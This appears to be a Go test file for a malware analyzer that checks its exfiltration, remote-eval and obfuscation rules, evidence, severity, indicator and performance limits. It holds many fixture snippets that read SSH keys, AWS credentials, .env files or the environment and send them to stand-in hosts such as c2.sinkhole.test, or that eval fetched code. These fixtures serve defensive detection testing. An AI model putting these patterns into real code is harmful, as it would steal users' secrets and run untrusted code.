		{name: "path defined by an arrow function", path: "a.js", data: "const sshDir = () => path.join(os.homedir(), '.ssh');\nfetch(url);\n"},
		{name: "path defined by a function expression", path: "a.js", data: "const sshDir = function () { return path.join(os.homedir(), '.ssh'); };\nfetch(url);\n"},
		{name: "path read inside an async arrow function that is called at once", path: "a.js", data: ev1o, want: []string{"EXFIL-001:1"}},
		{name: "path read inside the callback of map", path: "a.js", data: "const keys = ['config', 'known_hosts'].map((f) => fs.readFileSync(path.join(os.homedir(), '.ssh', f), 'utf8'));\nfetch(url, { method: 'POST', body: JSON.stringify(keys) });\n", want: []string{"EXFIL-001:1"}},
		{name: "path read inside a one-line async function", path: "a.js", data: "async function steal() { const c = readFileSync(join(homedir(), '.aws', 'credentials'), 'utf8'); await fetch(url, { method: 'POST', body: c }); }\n", want: []string{"EXFIL-001:1"}},
		{name: "path read inside a promise callback", path: "a.js", data: "Promise.resolve().then(() => fsp.readFile(path.join(os.homedir(), '.aws', 'credentials'), 'utf8')).then((c) => fetch(url, { method: 'POST', body: c }));\n", want: []string{"EXFIL-001:1"}},
		{name: "path returned by a function with a default", path: "a.js", data: "const f = () => process.env.CRED_FILE || path.join(os.homedir(), '.aws', 'credentials');\nfetch(url);\n"},
		{name: "path returned from a block", path: "a.js", data: "function f() {\n  return path.join(os.homedir(), '.ssh');\n}\nfetch(url);\n"},
		{name: "path returned by an arrow function and read elsewhere", path: "a.js", data: "const credsFile = () => path.join(os.homedir(), '.aws', 'credentials');\nfetch(url, { method: 'POST', body: fs.readFileSync(credsFile()) });\n"},

		{name: "response text handed to eval", path: "a.js", data: "fetch(url).then((r) => r.text()).then(eval);\n", want: []string{"EXEC-001:1"}},
		{name: "response text handed to eval of the global object", path: "a.js", data: "fetch(url).then((r) => r.text()).then(globalThis.eval);\n", want: []string{"EXEC-001:1"}},
		{name: "response text handed to a bound eval", path: "a.js", data: "fetch(url).then((r) => r.text()).then(eval.bind(null));\n", want: []string{"EXEC-001:1"}},
		{name: "response text handed to eval with optional chaining", path: "a.js", data: "fetch(url)?.then?.(eval);\n", want: []string{"EXEC-001:1"}},
		{name: "response text evaluated in an arrow callback", path: "a.js", data: "fetch(url).then((r) => r.text()).then((t) => eval(t));\n", want: []string{"EXEC-001:1"}},
		{name: "response text evaluated in a function callback", path: "a.js", data: "fetch(url)\n  .then(function (r) { return r.text(); })\n  .then(function (t) { eval(t); });\n", want: []string{"EXEC-001:3"}},
		{name: "eval of a loop variable next to a fetch", path: "run.js", data: testRunnerProbe},
		{name: "eval of a name assigned from an await", path: "a.js", data: "const r = await fetch(url);\nconst code = await r.text();\neval(code);\n", want: []string{"EXEC-001:3"}},
		{name: "eval of each part of a response in a for loop", path: "a.js", data: "for (const line of (await (await fetch(url)).text()).split(';;')) eval(line);\n", want: []string{"EXEC-001:1"}},
		{name: "eval of a name that the fetch does not produce", path: "a.js", data: "const r = await fetch(url);\neval(other);\n"},
		{name: "eval of a name assigned from the command line next to a fetch", path: "a.js", data: "await fetch(health);\nconst expr = process.argv[2];\neval(expr);\n"},
		{name: "eval of a name assigned from a local call next to a fetch", path: "a.js", data: "const r = await fetch(url);\nconst code = build();\neval(code);\n"},
		{name: "stream body evaluated at the end of the response", path: "a.js", data: "http.get(url, (res) => {\n  let body = '';\n  res.on('data', (c) => { body += c; });\n  res.on('end', () => eval(body));\n});\n", want: []string{"EXEC-001:4"}},
		{name: "new Function of a response text", path: "a.js", data: "const r = await fetch(url);\nconst f = new Function(await r.text());\nf();\n", want: []string{"EXEC-001:2"}},
		{name: "Function of axios data", path: "a.js", data: "const { data } = await axios.get(url);\nFunction(data)();\n", want: []string{"EXEC-001:2"}},
		{name: "fetched json is not code", path: "a.js", data: "fetch(url).then((r) => r.json()).then(console.log);\n"},
		{name: "fetched text parsed as json", path: "a.js", data: "const j = JSON.parse(await (await fetch(url)).text());\neval(\"1\");\n"},
		{name: "eval of a variable far from the fetch", path: "a.js", data: "const r = await fetch(url);\n" + strings.Repeat("work();\n", 40) + "eval(code);\n"},
		{name: "eval of a variable with no network call", path: "a.js", data: "list.map((t) => eval(t));\nPromise.resolve(code).then(eval);\n"},
		{name: "timer of a variable next to a fetch", path: "a.js", data: "const r = await fetch(url);\nsetTimeout(tick, 10);\n"},

		{name: "module bound in a later statement", path: "a.js", data: "let h;\ntry {\n  h = require('https');\n} catch (e) {}\nconst env = fs.readFileSync('.env', 'utf8');\nh.request(o).end(env);\n", want: []string{"EXFIL-001:5"}},
		{name: "module bound on the line after the equals sign", path: "a.js", data: "const h =\n  require('https');\nconst env = fs.readFileSync('.env', 'utf8');\nh.request(o).end(env);\n", want: []string{"EXFIL-001:3"}},
		{name: "module copied to another name", path: "a.js", data: "const a = require('https');\nconst b = a;\nconst env = fs.readFileSync('.env', 'utf8');\nb.request(o).end(env);\n", want: []string{"EXFIL-001:3"}},
		{name: "module copied twice", path: "a.js", data: "const a = require('https');\nconst b = a;\nconst c = b\nconst env = fs.readFileSync('.env', 'utf8');\nc.request(o).end(env);\n", want: []string{"EXFIL-001:4"}},
		{name: "function renamed by destructuring", path: "a.js", data: "const { request: r } = require('https');\nconst env = fs.readFileSync('.env', 'utf8');\nr(o).end(env);\n", want: []string{"EXFIL-001:2"}},
		{name: "default export of an imported module", path: "a.mjs", data: "import h from 'https';\nconst env = readFileSync('.env', 'utf8');\nh.default.request(o).end(env);\n", want: []string{"EXFIL-001:2"}},
		{name: "request through a namespace import of https", path: "a.mjs", data: "import * as h from 'https';\nconst env = readFileSync('.env', 'utf8');\nh.request(o).end(env);\n", want: []string{"EXFIL-001:2"}},
		{name: "copy of a module that is not a network module", path: "a.js", data: "const a = require('fs');\nconst b = a;\nconst env = b.readFileSync('.env', 'utf8');\nb.get(env);\n"},
		{name: "comparison is not a copy", path: "a.js", data: "const a = require('https');\nif (b == a) {}\nconst env = fs.readFileSync('.env', 'utf8');\nb.request(o).end(env);\n"},
		{name: "property assignment is not a copy", path: "a.js", data: "const a = require('https');\nthis.b = a;\nconst env = fs.readFileSync('.env', 'utf8');\nb.request(o).end(env);\n"},
		{name: "more names than the alias cap", path: "a.js", data: manyAliases()},
		{name: "python module imported by name", path: "a.py", data: "u = __import__('requests')\nu.post(url, data=open('.env').read())\n", want: []string{"EXFIL-001:2"}},
		{name: "python request module imported by its package name", path: "a.py", data: "u = __import__('urllib.request')\nu.request.urlopen(url, open('.env').read())\n", want: []string{"EXFIL-001:2"}},
		{name: "python module imported inline", path: "a.py", data: "__import__('requests').post(url, data=open('.env').read())\n", want: []string{"EXFIL-001:1"}},
		{name: "python module imported with importlib", path: "a.py", data: "r = importlib.import_module('requests')\nr.post(url, data=open('.env').read())\n", want: []string{"EXFIL-001:2"}},
		{name: "python import of a module that is not a network module", path: "a.py", data: "u = __import__('json')\nu.get(url, open('.env').read())\n"},
		{name: "python module imported and copied", path: "a.py", data: "import requests; s = requests; env = open('.env').read(); s.post(url, data=env)\n", want: []string{"EXFIL-001:1"}},
		{name: "python package imported and copied", path: "a.py", data: "import urllib.request\nu = urllib\nenv = open('.env').read()\nu.request.urlopen(url, env)\n", want: []string{"EXFIL-001:3"}},
		{name: "python module that is not a network module imported and copied", path: "a.py", data: "import json\ns = json\nenv = open('.env').read()\ns.post(url, data=env)\n"},
		{name: "python import from a network module is not a plain import", path: "a.py", data: "from requests import post\ns = post\nenv = open('.env').read()\ns(url, data=env)\n", want: []string{"EXFIL-001:3"}},
		{name: "python import_module without an assignment", path: "a.py", data: "importlib.import_module('requests')\nenv = open('.env').read()\nr.post(url, data=env)\n"},

		{name: "environment copy passed to a second variable", path: "a.js", data: "const e = { ...process.env };\nconst p = e;\nfetch(url, { method: 'POST', body: JSON.stringify(p) });\n", want: []string{"EXFIL-001:1"}},
		{name: "environment copied with Object.assign", path: "a.js", data: "const e = Object.assign({}, process.env);\nfetch(url, { body: JSON.stringify(e) });\n", want: []string{"EXFIL-001:1"}},
		{name: "environment encoded into a second variable", path: "a.js", data: "const e = { ...process.env };\nconst payload = Buffer.from(JSON.stringify(e));\nfetch(url, { body: payload });\n", want: []string{"EXFIL-001:1"}},
		{name: "python environment dict passed to a second variable", path: "a.py", data: "d = dict(os.environ)\npayload = d\nrequests.post(url, data=payload)\n", want: []string{"EXFIL-001:1"}},
		{name: "environment destructured to one variable", path: "a.js", data: "const { NODE_ENV } = process.env;\nfetch(url, { body: NODE_ENV });\n"},
		{name: "one property of an environment copy", path: "a.js", data: "const e = { ...process.env };\nconst mode = e.NODE_ENV;\nfetch(url, { body: mode });\n"},
		{name: "environment copy extended for a child", path: "a.js", data: "const e = Object.assign({}, process.env, { A: 1 });\nrun(cmd, { env: e });\nfetch(url, { body: other });\n"},
		{name: "environment copy with a request 80 lines later", path: "a.py", data: "env = os.environ.copy()\n" + strings.Repeat("work()\n", 80) + "urllib.request.urlopen(url)\n"},
		{name: "environment copy far from a request that uses it", path: "a.js", data: "const e = { ...process.env };\n" + strings.Repeat("work();\n", 150) + "fetch(url, { body: JSON.stringify(e) });\n"},
		{name: "environment copy as the body of a request", path: "a.js", data: "const res = await fetch(url, { method: 'POST', body: JSON.stringify(process.env) });\n", want: []string{"EXFIL-001:1"}},
		{name: "environment copy as an argument of a request that is assigned", path: "a.js", data: "const res = await axios.post(url, JSON.stringify(process.env));\n", want: []string{"EXFIL-001:1"}},
		{name: "python environment copy as the data of a request that is assigned", path: "a.py", data: "r = requests.post(url, data=dict(os.environ))\n", want: []string{"EXFIL-001:1"}},
		{name: "python environment copy sent by a later statement", path: "a.py", data: "d = dict(os.environ)\nreq = urllib.request.Request(url)\nurllib.request.urlopen(req, json.dumps(d).encode())\n", want: []string{"EXFIL-001:1"}},
		{name: "python environment copy to restore after a request", path: "requester.py", data: requesterProbe},
		{name: "python environment copy restored right after a request", path: "a.py", data: "old_env = dict(os.environ)\nr = requests.get(url)\nos.environ.clear()\nos.environ.update(old_env)\n"},
		{name: "python environment copy as the environment of a child and a request", path: "a.py", data: "env = dict(os.environ)\nsubprocess.run(cmd, env=env)\nrequests.get(url)\n", want: []string{"EXEC-002:2"}},
		{name: "python environment copy for a child, passed inline, and a request", path: "a.py", data: "subprocess.run(cmd, env=dict(os.environ))\nrequests.get(url)\n", want: []string{"EXEC-002:1"}},
		{name: "python proxy setting read from an environment copy", path: "a.py", data: "env = dict(os.environ)\nr = requests.get(url, proxies={'http': env.get('http_proxy')})\n"},
		{name: "environment copy given as the proxies of a request", path: "a.py", data: "env = dict(os.environ)\nr = requests.get(url, proxies=env)\n"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, _ := analyzeFile(t, tt.path, tt.data)

			if !slices.Equal(got, tt.want) {
				t.Errorf("findings = %v, want %v", got, tt.want)
			}
		})
	}
}

// rulesAt lists n findings of rule on consecutive lines from line.
func rulesAt(rule string, line, n int) []string {
	var out []string
	for i := range n {
		out = append(out, fmt.Sprintf("%s:%d", rule, line+i))
	}
	return out
}

// textBlobs returns n lines, each a string that holds base64 of about size
// bytes of text. Every blob differs, and each decodes to printable text.
func textBlobs(n, size int) string {
	var b strings.Builder
	for i := range n {
		text := strings.Repeat(fmt.Sprintf("// filler text %d of a blob\n", i), size/24+1)
		fmt.Fprintf(&b, "var k%d = '%s';\n", i, b64(text))
	}
	return b.String()
}

// envCopies returns n lines that each copy the environment to a new variable.
func envCopies(n int) string {
	var b strings.Builder
	for i := range n {
		fmt.Fprintf(&b, "var e%d=process.env;\n", i)
	}
	return b.String()
}

// manyAliases binds one name more than the alias cap and uses the last one.
func manyAliases() string {
	var b strings.Builder
	for i := range 33 {
		fmt.Fprintf(&b, "const a%d = require('https');\n", i)
	}
	b.WriteString("const env = fs.readFileSync('.env', 'utf8');\na32.request(o).end(env);\n")
	return b.String()
}

// binaryBytes returns n bytes that are not text.
func binaryBytes(n int) []byte {
	b := make([]byte, n)
	for i := range b {
		b[i] = byte(i*7+0x80) | 0x80
	}
	return b
}

func TestEvidence(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		path string
		data string
		// expectations
		wantRule     string
		wantEvidence []protocol.Evidence
	}{
		{
			name:         "padding snippet starts at the hidden code",
			path:         "index.js",
			data:         "a();\nlisten();" + pad(300) + "run();\n",
			wantRule:     "GAL-OBF-001",
			wantEvidence: []protocol.Evidence{{Path: "index.js", Line: 2, Snippet: "run();"}},
		},
		{
			name:     "decoded finding points at the literal line and keeps the decoded text",
			path:     "index.js",
			data:     "a();\nvar p = '" + b64(exfilPayload) + "';\n",
			wantRule: "GAL-EXFIL-001",
			wantEvidence: []protocol.Evidence{
				{Path: "index.js", Line: 2, Snippet: "decoded: const body = JSON.stringify(process.env);"},
				{Path: "index.js", Line: 2, Snippet: "decoded: https.request({ hostname: 'c2.sinkhole.test', method: 'POST' }).end(body);"},
			},
		},
		{
			name:     "secret line first and network line second",
			path:     "lure.eml!/setup.js",
			data:     "const fs = require('fs');\nconst e = fs.readFileSync('../.env');\nwork();\nhttps.request(o).end(e);\n",
			wantRule: "GAL-EXFIL-001",
			wantEvidence: []protocol.Evidence{
				{Path: "lure.eml!/setup.js", Line: 2, Snippet: "const e = fs.readFileSync('../.env');"},
				{Path: "lure.eml!/setup.js", Line: 4, Snippet: "https.request(o).end(e);"},
			},
		},
		{
			name:     "variable assignment is the second evidence",
			path:     "a.py",
			data:     "code = base64.b64decode(x)\nwork()\nexec(code)\n",
			wantRule: "GAL-OBF-002",
			wantEvidence: []protocol.Evidence{
				{Path: "a.py", Line: 3, Snippet: "exec(code)"},
				{Path: "a.py", Line: 1, Snippet: "code = base64.b64decode(x)"},
			},
		},
		{
			name:         "match deep in a long line shows its neighbourhood",
			path:         "a.js",
			data:         strings.Repeat("a=1;", 500) + "eval(atob(x));" + strings.Repeat("b=2;", 10) + "\n",
			wantRule:     "GAL-OBF-002",
			wantEvidence: []protocol.Evidence{{Path: "a.js", Line: 1, Snippet: strings.Repeat("a=1;", 15) + "eval(atob(x));" + strings.Repeat("b=2;", 10)}},
		},
		{
			name:         "control characters in the snippet are cleaned",
			path:         "a.js",
			data:         "eval(atob('\x1b[31m'));\r\n",
			wantRule:     "GAL-OBF-002",
			wantEvidence: []protocol.Evidence{{Path: "a.js", Line: 1, Snippet: `eval(atob('\u001b[31m'));`}},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, out := analyzeFile(t, tt.path, tt.data)

			for _, fi := range out.Findings {
				if fi.RuleID == tt.wantRule {
					if !slices.Equal(fi.Evidence, tt.wantEvidence) {
						t.Errorf("evidence = %+v, want %+v", fi.Evidence, tt.wantEvidence)
					}
					return
				}
			}
			t.Errorf("no %s in %+v", tt.wantRule, out.Findings)
		})
	}
}

func TestSeverity(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		path string
		data string
		// expectations
		wantSeverity protocol.Severity
		wantLines    []int // lines of the evidence
	}{
		{
			name:         "secret and network use close together are critical",
			path:         "a.js",
			data:         "const stolen = fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'));\nfetch(url, { body: stolen });\n",
			wantSeverity: protocol.SeverityCritical,
			wantLines:    []int{1, 2},
		},
		{
			name:         "secret and network use far apart are high, with both places",
			path:         "a.js",
			data:         "const stolen = fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'));\n" + strings.Repeat("work();\n", 150) + "fetch(url, { body: stolen });\n",
			wantSeverity: protocol.SeverityHigh,
			wantLines:    []int{1, 152},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, out := analyzeFile(t, tt.path, tt.data)

			if len(out.Findings) != 1 {
				t.Fatalf("findings = %+v, want one", out.Findings)
			}
			fi := out.Findings[0]
			var lines []int
			for _, e := range fi.Evidence {
				lines = append(lines, e.Line)
			}
			if fi.RuleID != "GAL-EXFIL-001" || fi.Severity != tt.wantSeverity || !slices.Equal(lines, tt.wantLines) {
				t.Errorf("finding = %s %s at lines %v, want GAL-EXFIL-001 %s at %v", fi.RuleID, fi.Severity, lines, tt.wantSeverity, tt.wantLines)
			}
		})
	}
}

// decoys returns n credential files that are read at the top of a file and
// sent 100 lines further down, far from the end of the file.
func decoys(n int) string {
	var b strings.Builder
	names := make([]string, n)
	for i := range n {
		names[i] = fmt.Sprintf("decoy%d", i)
		fmt.Fprintf(&b, "const %s = fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'));\n", names[i])
	}
	b.WriteString(strings.Repeat("work();\n", 120))
	fmt.Fprintf(&b, "fetch('https://telemetry.test/ping', { body: [%s] });\n", strings.Join(names, ", "))
	return b.String()
}

func TestSeverityCounts(t *testing.T) {
	near := "const key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'));\nfetch('https://c2.test/k', { body: key });\n"
	tests := []struct {
		name string
		// inputs
		data string
		// expectations
		wantCritical int
		wantHigh     int
	}{
		{name: "near pair after twenty far pairs is still critical", data: decoys(20) + near, wantCritical: 1, wantHigh: protocol.MaxFindingsPerRulePerFile - 1},
		{name: "far pairs alone are high", data: decoys(20), wantCritical: 0, wantHigh: protocol.MaxFindingsPerRulePerFile},
		{name: "near pair alone is critical", data: near, wantCritical: 1, wantHigh: 0},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, out := analyzeFile(t, "setup.js", tt.data)

			critical, high := 0, 0
			for _, fi := range out.Findings {
				switch {
				case fi.RuleID != "GAL-EXFIL-001":
				case fi.Severity == protocol.SeverityCritical:
					critical++
				case fi.Severity == protocol.SeverityHigh:
					high++
				}
			}
			if critical != tt.wantCritical || high != tt.wantHigh {
				t.Errorf("critical, high = %d, %d, want %d, %d", critical, high, tt.wantCritical, tt.wantHigh)
			}
		})
	}
}

func TestIndicators(t *testing.T) {
	payload := "const u = 'https://c2.sinkhole.test/collect';\nmail('ops@bad.sinkhole.test');\nfetch(u);\n" + strings.Repeat("// 0123456789 padding\n", 12)
	tests := []struct {
		name string
		// inputs
		data string
		// expectations
		wantIOCs []protocol.IOC
	}{
		{
			name: "blob that decodes to text lists its indicators at the line of the literal",
			data: "a();\nvar p = '" + b64(payload) + "';\n",
			wantIOCs: []protocol.IOC{
				{Type: "url", Value: "https://c2.sinkhole.test/collect", Path: "a.js", Line: 2},
				{Type: "domain", Value: "c2.sinkhole.test", Path: "a.js", Line: 2},
				{Type: "email", Value: "ops@bad.sinkhole.test", Path: "a.js", Line: 2},
				{Type: "domain", Value: "bad.sinkhole.test", Path: "a.js", Line: 2},
			},
		},
		{
			name: "same indicator twice in a blob is listed once",
			data: "var p = '" + b64(strings.Repeat("// see https://c2.sinkhole.test/x\n", 12)) + "';\n",
			wantIOCs: []protocol.IOC{
				{Type: "url", Value: "https://c2.sinkhole.test/x", Path: "a.js", Line: 1},
				{Type: "domain", Value: "c2.sinkhole.test", Path: "a.js", Line: 1},
			},
		},
		{name: "blob of binary data has none", data: "ICON = '" + base64.StdEncoding.EncodeToString(binaryBytes(300)) + "'\n"},
		{name: "indicator in the clear is left to the ioc analyzer", data: "var u = 'https://c2.sinkhole.test/x';\n"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, out := analyzeFile(t, "a.js", tt.data)

			if !slices.Equal(out.IOCs, tt.wantIOCs) {
				t.Errorf("iocs = %+v, want %+v", out.IOCs, tt.wantIOCs)
			}
		})
	}
}

func TestIndicatorsCapped(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		hosts int
		// expectations
		wantMax int
	}{
		{name: "blob full of urls", hosts: 500, wantMax: 64},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var b strings.Builder
			for i := range tt.hosts {
				fmt.Fprintf(&b, "// https://h%d.sinkhole.test/\n", i)
			}
			_, out := analyzeFile(t, "a.js", "var p = '"+b64(b.String())+"';\n")

			if len(out.IOCs) != tt.wantMax {
				t.Errorf("iocs = %d, want %d", len(out.IOCs), tt.wantMax)
			}
		})
	}
}

func TestAnalyzeCapsFindings(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		data string
		// expectations
		wantRule  string
		wantCount int
	}{
		{name: "padded lines", data: strings.Repeat("x();"+pad(200)+"y();\n", 30), wantRule: "GAL-OBF-001", wantCount: protocol.MaxFindingsPerRulePerFile},
		{name: "decoded eval calls", data: strings.Repeat("eval(atob(x));\n", 30), wantRule: "GAL-OBF-002", wantCount: protocol.MaxFindingsPerRulePerFile},
		{name: "blobs", data: strings.Repeat("var k = '"+unit(256)+"';\n", 30), wantRule: "GAL-OBF-003", wantCount: protocol.MaxFindingsPerRulePerFile},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, out := analyzeFile(t, "a.js", tt.data)

			n := 0
			for _, fi := range out.Findings {
				if fi.RuleID == tt.wantRule {
					n++
				}
			}
			if n != tt.wantCount {
				t.Errorf("%s findings = %d, want %d", tt.wantRule, n, tt.wantCount)
			}
		})
	}
}

// hangGuard ends a run that never finishes. It is far above any real run time,
// so a slow or busy machine (or the race detector) cannot trip it; the speed of
// the analyzer is checked by TestAnalyzeScalesLinearly instead.
const hangGuard = 5 * time.Minute

// TestAnalyzeLimits checks that huge lines are handled: the analysis finds what
// is there and ends with the expected skip, or none. A run that hits the hang
// guard ends with a timeout skip and fails here.
func TestAnalyzeLimits(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		path string
		data string
		// expectations
		wantRules []string
		wantSkip  string
	}{
		{name: "3 MB minified line", path: "big.min.js", data: strings.Repeat(minifiedUnit, 3<<20/len(minifiedUnit)) + "\n"},
		{name: "1 MB run of spaces before code", path: "pad.js", data: "a();" + pad(1<<20) + "b();\n", wantRules: []string{"OBF-001:1"}},
		{name: "1 MB run of spaces only", path: "pad.js", data: pad(1 << 20)},
		{name: "payload at the end of a 2 MB line", path: "big.js", data: strings.Repeat(minifiedUnit, 2<<20/len(minifiedUnit)) + "eval(atob(x));\n", wantRules: []string{"OBF-002:1"}},
		{name: "payload across a window cut", path: "cut.js", data: strings.Repeat(";", 256<<10-4) + "eval(atob(x));\n", wantRules: []string{"OBF-002:1"}},
		{name: "1 MB of unclosed calls", path: "eval.js", data: strings.Repeat("eval(", 1<<20/5), wantSkip: protocol.SkipBudget},
		{name: "2 MB blob on one line", path: "blob.js", data: "var x='" + unit(2<<20) + "';\n", wantRules: []string{"OBF-003:1"}},
		{name: "many copies of an alias", path: "copies.js", data: strings.Repeat("b=h;", 1<<17) + "\nconst h = require('https');\nconst e = fs.readFileSync('.env');\nh.request(o).end(e);\n", wantRules: []string{"EXFIL-001:3"}},
		{name: "900 credential path segments on separate lines", path: "paths.js", data: strings.Repeat("join(a, '.ssh');\n", 900) + "fetch(u);\n", wantRules: rulesAt("EXFIL-001", 801, protocol.MaxFindingsPerRulePerFile)},
		{name: "1200 credential path segments are more than are checked", path: "paths.js", data: strings.Repeat("join(a, '.ssh');\n", 1200) + "fetch(u);\n", wantSkip: protocol.SkipBudget},
		{name: "40 environment copies, each followed by 1000 assignments", path: "carriers.js", data: strings.Repeat("var e=process.env;\n"+strings.Repeat("x=e;", 1000)+"\n", 40) + "const k = fs.readFileSync('.env');\nfetch(u, { body: k });\n", wantRules: []string{"EXFIL-001:81"}, wantSkip: protocol.SkipBudget},
		{name: "5000 bare dynamic imports before a request", path: "imports.py", data: strings.Repeat("__import__('requests')\n", 5000) + "x = open('.env').read()\nimport requests\nrequests.post(u, data=x)\n", wantRules: []string{"EXFIL-001:5001"}, wantSkip: protocol.SkipBudget},
		{name: "4100 dynamic imports of other modules before a request module", path: "imports.py", data: strings.Repeat("m = __import__('os')\n", 4100) + "import requests as r\nr.post(u, data=open('.env').read())\n", wantRules: []string{"EXFIL-001:4102"}},
		{name: "5000 plain imports of other modules before a request module", path: "imports.py", data: strings.Repeat("import os\n", 5000) + "import requests\ns = requests\ns.post(u, data=open('.env').read())\n", wantRules: []string{"EXFIL-001:5003"}},
		{name: "17 blobs that decode to text are more than are decoded", path: "blobs.js", data: textBlobs(17, 400), wantRules: rulesAt("OBF-003", 1, 17), wantSkip: protocol.SkipBudget},
		{name: "3 blobs of 512 KB are more than the decoded total", path: "blobs.js", data: textBlobs(3, 400<<10), wantRules: rulesAt("OBF-003", 1, 3), wantSkip: protocol.SkipBudget},
		{name: "1M calls that start a process are more hits than are kept", path: "hits.py", data: strings.Repeat("os.system(", 1<<20+1), wantRules: slices.Repeat([]string{"EXEC-002:1"}, protocol.MaxFindingsPerRulePerFile), wantSkip: protocol.SkipBudget},
		{name: "1100 secret references in one window are more than signals returns", path: "refs.js", data: strings.Repeat("$A_KEY;\n", 1100) + ".ssh/id_rsa\n", wantSkip: protocol.SkipBudget},
		{name: "1100 network tools in one window are more than signals returns", path: "tools.js", data: strings.Repeat("curl x;\n", 1100), wantSkip: protocol.SkipBudget},
		{name: "7 MB of windows are more than the signals budget", path: "windows.js", data: strings.Repeat("curl x; "+strings.Repeat("y", 400)+"\n", 7<<20/410), wantSkip: protocol.SkipBudget},
		{name: "9000 callbacks that hand a response to eval exhaust the call argument budget", path: "then.js", data: strings.Repeat("p.then(eval);\n", 9000), wantSkip: protocol.SkipBudget},
		{name: "80 calls with a name that is never assigned exhaust the lookback", path: "lookback.js", data: strings.Repeat("y;\n", 25000) + strings.Repeat("eval(zq);\n", 80), wantSkip: protocol.SkipBudget},
		{name: "2100 credential paths assigned to a variable are more than are checked for far requests", path: "far.js", data: strings.Repeat("credpath = join(a, '.aws', 'credentials');\n"+strings.Repeat("// pad\n", 140), 2100) + "fetch(u);\n", wantSkip: protocol.SkipBudget},
		{name: "3000 environment copies exhaust the carrier search", path: "copies.js", data: envCopies(3000) + "fetch(u);\n", wantSkip: protocol.SkipBudget},
		{name: "many assignments to look back through", path: "assign.py", data: strings.Repeat("a=", 2<<20) + "\nexec(a)\n"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx, cancel := context.WithTimeout(context.Background(), hangGuard)
			defer cancel()

			got, out := analyzeFileCtx(t, ctx, tt.path, tt.data)

			if want := slices.Sorted(slices.Values(tt.wantRules)); !slices.Equal(got, want) {
				t.Errorf("findings = %v, want %v", got, want)
			}
			var skip string
			if len(out.Skips) > 0 {
				skip = out.Skips[0].Reason
			}
			if len(out.Skips) > 1 || skip != tt.wantSkip {
				t.Errorf("skips = %v, want %q", out.Skips, tt.wantSkip)
			}
		})
	}
}

// TestAnalyzeScalesLinearly guards against quadratic work on the inputs that
// are built to cause it. It compares run times instead of using a fixed limit,
// so a slow or busy machine (or the race detector) does not make it flaky: a
// 16x larger input must take well under the 256x a quadratic scan would show
// (measured: about 7-40x linear, 110x and more quadratic).
func TestAnalyzeScalesLinearly(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		path    string
		build   func(n int) string
		small   int
		large   int
		control func(n int) string // when set, the small input is control(large): the same size without the flood
		// expectations
		wantMaxRatio float64
	}{
		{name: "16x more unclosed calls", path: "eval.js", build: func(n int) string { return strings.Repeat("eval(", n/5) }, small: 16 << 10, large: 256 << 10, wantMaxRatio: 60},
		{name: "16x longer run of spaces", path: "pad.js", build: func(n int) string { return "a();" + pad(n) + "b();\n" }, small: 256 << 10, large: 4 << 20, wantMaxRatio: 100},
		{name: "16x longer minified line", path: "big.min.js", build: func(n int) string { return strings.Repeat(minifiedUnit, n/len(minifiedUnit)) + "\n" }, small: 128 << 10, large: 2 << 20, wantMaxRatio: 100},
		{name: "16x more blobs", path: "blobs.js", build: func(n int) string { return strings.Repeat("var k = '"+unit(256)+"';\n", n/270) }, small: 128 << 10, large: 2 << 20, wantMaxRatio: 100},
		{name: "16x more environment copies", path: "carriers.js", build: func(n int) string {
			return strings.Repeat("var e=process.env;\n"+strings.Repeat("work();\n", 200), n/1620) + "const k = fs.readFileSync('.env');\nfetch(u, { body: k });\n"
		}, small: 16 << 10, large: 256 << 10, wantMaxRatio: 100},
		{name: "16x more dynamic imports", path: "imports.py", build: func(n int) string {
			return strings.Repeat("__import__('requests')\n", n/23) + "x = open('.env').read()\nimport requests\nrequests.post(u, data=x)\n"
		}, small: 4 << 10, large: 64 << 10, wantMaxRatio: 100},
		{
			name: "a flood of imports of other modules costs about the same as other calls", path: "imports.py",
			build: func(n int) string {
				return strings.Repeat("__import__('a')\n", n/16) + "x = open('.env').read()\nimport requests\nrequests.post(u, data=x)\n"
			},
			control: func(n int) string {
				return strings.Repeat("__imput__('a')\n", n/16) + "x = open('.env').read()\nimport requests\nrequests.post(u, data=x)\n"
			},
			large: 8 << 20, wantMaxRatio: 3,
		},
		{name: "16x more copies of an alias", path: "copies.js", build: func(n int) string {
			return strings.Repeat("b=h;", n/4) + "\nconst h = require('https');\nconst e = fs.readFileSync('.env');\nh.request(o).end(e);\n"
		}, small: 64 << 10, large: 1 << 20, wantMaxRatio: 100},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			small := analyze.File{Path: tt.path, Name: tt.path, Data: []byte(tt.build(tt.small))}
			if tt.control != nil {
				small.Data = []byte(tt.control(tt.large))
			}
			large := analyze.File{Path: tt.path, Name: tt.path, Data: []byte(tt.build(tt.large))}

			ratio := float64(fastest(t, large)) / float64(fastest(t, small))

			t.Logf("time ratio %.1f", ratio)
			if ratio > tt.wantMaxRatio {
				t.Errorf("time ratio %.1f, want at most %.1f", ratio, tt.wantMaxRatio)
			}
		})
	}
}

// fastest returns the best of three Analyze runs to damp scheduling noise.
// A run that skips was cut short by a budget, so its time says nothing about scaling.
func fastest(t *testing.T, f analyze.File) time.Duration {
	t.Helper()
	best := time.Duration(math.MaxInt64)
	for range 3 {
		ctx, cancel := context.WithTimeout(context.Background(), hangGuard)
		start := time.Now()
		out, err := script.New().Analyze(ctx, f)
		cancel()
		if err != nil {
			t.Fatal(err)
		}
		if len(out.Skips) > 0 {
